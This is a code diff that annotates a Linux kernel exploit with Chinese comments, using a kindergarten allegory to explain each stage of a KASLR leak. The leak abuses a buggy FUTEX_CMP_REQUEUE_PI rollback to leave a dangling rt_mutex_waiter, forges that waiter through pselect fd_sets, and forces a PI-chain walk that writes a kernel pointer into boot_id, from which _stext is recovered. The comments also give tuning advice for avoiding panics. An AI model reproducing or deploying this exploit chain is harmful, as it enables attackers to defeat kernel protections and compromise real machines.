@@ -1,3 +1,24 @@
+/* ==========================================================================
+ * 【第 1 关】偷看园长的排班表 —— KASLR 泄漏 (slide 路线)
+ * ==========================================================================
+ * 园长每天换办公室位置(KASLR)，你不知道她在哪。但你发现她有个习惯：
+ * 让小朋友传话(pselect 排队)时，会在纸条背面不小心印出办公室门牌号。
+ *
+ * 具体玩法：
+ *   a) waiter/owner 演双簧制造死锁环 -> FUTEX_CMP_REQUEUE_PI 走进 buggy
+ *      回滚，把 waiter 内核栈上的排队标签(rt_mutex_waiter)变成"鬼标签"
+ *   b) waiter 醒来后在同一个栈位置发起 pselect，用 fd_set 把"假标签"
+ *      预先写进这片栈 —— 园长回头来整理鬼标签时，读到的全是我们写的内容
+ *   c) consumer 喊老师改优先级(sched_setattr) -> 园长沿鬼标签走 PI 链，
+ *      途中把假标签的 tree_entry(门牌墨痕) 写进 /proc/sys/kernel/random/boot_id
+ *   d) 读 boot_id，减去编译期已知的 loggers[0] 偏移 => 园长办公室门牌 _stext
+ *
+ * 本关安全要点(全图自包含在一个回收页内，绝不碰随机化地址)：
+ *   - 假标签父指针全染红(RED)：摘红色叶子标签不用找邻居核对，零副作用
+ *   - 假标签树根 fake_w0 染黑(BLACK)：补挂标签时不会触发红红冲突找祖父
+ *   - 任何一步碰未映射地址 = 整个幼儿园拉响警报(内核 panic 重启)
+ * ========================================================================== */
+
 #include "common.h"
 
 #define SLIDE_MAX_ATTEMPTS 40
@@ -119,6 +140,11 @@ static void slide_dump_fdsets(
   fflush(stdout);
 }
 
+/* 【伪造假标签】把伪造的 rt_mutex_waiter 逐字(8 字节/格)写进 fd_set。
+ * pselect 进内核后会把 fd_set 拷到栈上 —— 恰好盖住鬼标签的位置(shift 对齐)。
+ * 11 个格子对应假标签的 11 个字段：树父/右/左、PI树父/右/左、
+ * task、lock、优先级、截止时间、ww_ctx。
+ * 所有指针都指向魔法书包(回收页)内部 —— 页内自包含，绝不越界。 */
 static void prepare_slide_pselect_fdsets_shifted(
     fd_set *in, fd_set *out, fd_set *ex) {
   FD_ZERO(in);
@@ -176,6 +202,9 @@ void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
   FD_SET(SLIDE_PSELECT_NFDS - 1, ex);
 }
 
+/* 【传话排队】waiter 睡进 pselect(纸条交上去、栈上盖好假标签)，
+ * 同时放一个捣乱的 consumer 线程在旁边待命 —— 它负责喊老师改优先级，
+ * 逼园长沿着鬼标签走 PI 链，把门牌墨痕写到 boot_id 纸条上。 */
 void slide_pselect_stack_copy(void) {
   if (!page_base || !fake_lock || !fake_w0) {
     pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
@@ -261,6 +290,13 @@ static void slide_alarm_handler(int sig __attribute__((unused))) {
   syscall(SYS_setpriority, PRIO_PROCESS, 0, 5);
 }
 
+/* 【捣乱的小朋友】两段式喊话：
+ * 1) RT-ENTER：喊"给 waiter 转 SCHED_FIFO 实时班"(几乎必被拒 EPERM，
+ *    因为没权限 —— 这一步只是探路，不会触发 PI 链遍历)
+ * 2) NICE-ENTER：改喊"给 waiter 调 nice 值"(这个允许) —— 老师改优先级
+ *    必须走 rt_mutex_setprio -> adjust_prio_chain，园长被迫沿鬼标签走路！
+ * 上次内核重启就死在这一步：摘黑色鬼标签要找邻居核对 -> 空指针。
+ * 修复后(父指针全红)摘标签零副作用，这里应能安全走到 NICE-DONE。 */
 void *slide_consumer_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
   pin_to_core(CONSUMER_CORE);
@@ -326,6 +362,13 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
   }
 }
 
+/* 【传纸条的小朋友】动作顺序(一步都不能乱)：
+ * 1. 抢到 pi_chain 玩具(拿住不放，形成环的下半圈)
+ * 2. 等 owner 就位后，去 f_wait 排队并登记"想换到 pi_target"(FUTEX_WAIT_REQUEUE_PI)
+ *    —— 园长在 waiter 内核栈上挂好真排队标签 rt_mutex_waiter
+ * 3. 收到闹钟(SIGALRM)后立刻原地 pselect —— 栈上真标签变鬼标签，
+ *    同一片栈马上被我们的 fd_set 假标签覆盖
+ * 4. 全程不放开 pi_chain：一放手 owner 醒来乱跑，园长沿鬼标签走路必崩 */
 void *slide_waiter_thread(void *arg __attribute__((unused))) {
   int tid = (int)SYSCHK(syscall(SYS_gettid));
   atomic_store(&slide_waiter_tid, tid);
@@ -383,6 +426,11 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
   }
 }
 
+/* 【占玩具的小朋友】先抱住 pi_target 玩具(环的上半圈)，等 waiter
+ * 挂好标签后，自己也去排队抢 pi_chain —— 和 waiter 面对面互等，
+ * 死锁环闭合：owner->chain->waiter->target->owner。
+ * 必须卡在"已睡死在 pi_chain 上"的状态(wchan=futex)，园长换玩具时
+ * 才会撞见死锁，走进 buggy 回滚路径把真标签错摘成鬼标签。 */
 void *slide_owner_thread(void *arg __attribute__((unused))) {
   int tid = (int)SYSCHK(syscall(SYS_gettid));
   atomic_store(&slide_owner_tid, tid);
@@ -424,6 +472,10 @@ int hex_value(char c) {
   return -1;
 }
 
+/* 【读纸条背面】园长整理鬼标签时会把假标签的 tree_entry(我们种下的
+ * 墨痕值)写进 boot_id 纸条。读出来有两种结局：
+ *  - 值 == 我们种下的假门牌 => 写原语打通(机制证明)，但还不是真门牌
+ *  - 值减去编译期 loggers[0] 偏移后 2MB 对齐 => 真园长办公室门牌 _stext！ */
 uint64_t slide_read_stext(void) {
   char buf[64];
   unsigned char raw[16];
@@ -514,6 +566,11 @@ static int slide_owner_wchan_is_futex(int tid) {
   return strstr(buf, "futex") != NULL;
 }
 
+/* 【闯关导演(子进程)】按剧本走完整场戏：
+ * 确认 owner 真的睡死在 pi_chain 上(wchan 查岗) -> 喊"换玩具！"
+ * (FUTEX_CMP_REQUEUE_PI) -> 期待 ret=-1/EDEADLK(buggy 回滚被触发) ->
+ * 闹钟叫醒 waiter 去 pselect 盖假标签 -> 等 consumer 喊完老师 ->
+ * 读 boot_id 纸条背面的门牌墨痕。 */
 uint64_t slide_child_leak_stext(void) {
   sigset_t block;
   sigemptyset(&block);
@@ -571,6 +628,11 @@ uint64_t slide_child_leak_stext(void) {
   return slide_read_stext();
 }
 
+/* 【第 1 关总入口】多次尝试(最多 40 轮)，每轮：
+ *   - 轮换 shift(纸条和栈的对齐偏差，编译器布局决定，需试出来)
+ *   - 第 1 轮是"彩排"(probe)：consumer 不喊老师，验证 pselect 本身不崩
+ *   - 每轮新备一个魔法书包(内核页)，演砸了(child 崩)也只损失一轮
+ * 闯关成功判据：子进程从管道送回非零 _stext 门牌号。 */
 int slide_leak_kernel_base(void) {
   /* shift = (futex waiter stack offset - pselect fd_set word0 offset) / 8.
    * Compiler/layout dependent: override with SLIDE_SHIFT env to probe.
